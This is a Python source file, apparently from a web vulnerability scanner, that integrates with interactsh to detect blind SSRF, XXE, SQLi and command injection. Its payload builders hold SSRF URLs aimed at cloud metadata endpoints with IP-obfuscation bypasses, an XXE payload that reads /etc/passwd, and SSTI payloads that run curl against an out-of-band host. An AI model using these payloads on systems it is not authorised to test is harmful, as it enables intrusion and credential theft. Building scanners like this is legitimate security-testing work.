"""
Out-of-Band (OOB) Testing Handler — poin 41 dari perbaikan.
Integrasi dengan interactsh untuk deteksi blind SSRF, XXE, SQLi, command injection.
"""
import os
import time
import uuid
import threading
import logging
import requests

logger = logging.getLogger('snooger')


class OOBHandler:
    """
    Manages out-of-band interactions using interactsh or similar services.
    Used to detect blind vulnerabilities (blind SSRF, blind XXE, blind SQLi,
    blind command injection) that don't produce visible output.
    """

    def __init__(self, config: dict):
        oob_cfg = config.get('oob', {})
        self.enabled = oob_cfg.get('enabled', False)
        self.server = os.environ.get('INTERACTSH_URL', oob_cfg.get('server', 'https://interact.sh'))
        self.token = os.environ.get('INTERACTSH_TOKEN', oob_cfg.get('token', ''))
        self.poll_interval = oob_cfg.get('poll_interval', 5)
        self._correlation_id = None
        self._secret_key = None
        self._interactions: list = []
        self._polling: bool = False
        self._poll_thread = None

    def setup(self) -> bool:
        """Initialize interactsh session. Returns True on success."""
        if not self.enabled:
            return False
        try:
            # Register with interactsh server
            headers = {}
            if self.token:
                headers['Authorization'] = f'Bearer {self.token}'

            resp = requests.get(
                f"{self.server}/register",
                headers=headers,
                timeout=15
            )
            if resp.status_code == 200:
                data = resp.json()
                self._correlation_id = data.get('correlation-id') or data.get('id')
                self._secret_key = data.get('secret-key') or data.get('secretKey', '')
                logger.info(f"[OOB] Interactsh registered: {self._correlation_id}")
                self._start_polling()
                return True
            else:
                logger.warning(f"[OOB] Interactsh registration failed: {resp.status_code}")
                return False
        except Exception as e:
            logger.warning(f"[OOB] Could not connect to interactsh: {e}")
            self.enabled = False
            return False

    def get_payload_url(self, tag: str = '') -> str:
        """
        Generate a unique OOB URL for use in payloads.
        e.g. http://<uuid>.<correlation_id>.interact.sh
        """
        if not self.enabled or not self._correlation_id:
            return f"http://oob-test-{uuid.uuid4().hex[:8]}.example.com"

        uid = uuid.uuid4().hex[:8]
        if tag:
            uid = f"{tag}-{uid}"
        domain = self._correlation_id.split('.')[0] if '.' in self._correlation_id else self._correlation_id
        return f"http://{uid}.{domain}.interact.sh"

    def get_interactions(self, wait: float = 0) -> list:
        """
        Return recorded interactions. Optionally wait for new ones.
        """
        if wait > 0:
            time.sleep(wait)
        return list(self._interactions)

    def check_interaction_for(self, tag: str, timeout: float = 15) -> dict | None:
        """
        Poll for an interaction matching a specific tag.
        Returns interaction dict if found, None if timeout.
        """
        deadline = time.time() + timeout
        while time.time() < deadline:
            for interaction in self._interactions:
                if tag in str(interaction.get('full-id', '')):
                    return interaction
            time.sleep(self.poll_interval)
        return None

    def _start_polling(self):
        """Start background thread to poll for interactions."""
        self._polling = True
        self._poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._poll_thread.start()

    def _poll_loop(self):
        while self._polling and self.enabled:
            try:
                self._fetch_interactions()
            except Exception as e:
                logger.debug(f"[OOB] Poll error: {e}")
            time.sleep(self.poll_interval)

    def _fetch_interactions(self):
        if not self._correlation_id:
            return
        try:
            headers = {}
            if self.token:
                headers['Authorization'] = f'Bearer {self.token}'
            if self._secret_key:
                headers['X-Secret-Key'] = self._secret_key

            resp = requests.get(
                f"{self.server}/poll",
                params={'id': self._correlation_id},
                headers=headers,
                timeout=10
            )
            if resp.status_code == 200:
                data = resp.json()
                new_interactions = data.get('data', [])
                for item in new_interactions:
                    if item not in self._interactions:
                        self._interactions.append(item)
                        logger.info(f"[OOB] New interaction: {item.get('protocol', '?')} from {item.get('remote-address', '?')}")
        except Exception:
            pass

    def stop(self):
        """Stop polling."""
        self._polling = False

    def has_interactions(self) -> bool:
        return len(self._interactions) > 0

    def build_ssrf_payloads(self, tag: str) -> list:
        """Return SSRF payload URLs for common cloud metadata endpoints."""
        oob_url = self.get_payload_url(tag)
        return [
            oob_url,
            f"http://169.254.169.254/latest/meta-data/",  # AWS
            f"http://metadata.google.internal/computeMetadata/v1/",  # GCP
            f"http://169.254.169.254/metadata/v1/",  # Azure
            f"http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
            f"http://[::ffff:169.254.169.254]/",  # IPv6 bypass
            f"http://0177.0.0.01/",  # Octal bypass
        ]

    def build_xxe_payload(self, tag: str, target_file: str = '/etc/passwd') -> str:
        """Return XXE payload using OOB URL."""
        oob = self.get_payload_url(tag)
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{oob}">
  <!ENTITY xxe2 SYSTEM "file://{target_file}">
]>
<foo>&xxe;&xxe2;</foo>"""

    def build_ssti_oob_payloads(self, tag: str) -> list:
        """SSTI payloads that trigger OOB via HTTP request."""
        oob = self.get_payload_url(tag)
        return [
            f"${{T(java.net.URL)(\"{oob}\").openConnection().connect()}}",
            f"{{{{''.__class__.__mro__[1].__subclasses__()[117](\"{oob}\",shell=True)}}}}",
            f"<%=`curl {oob}`%>",
        ]
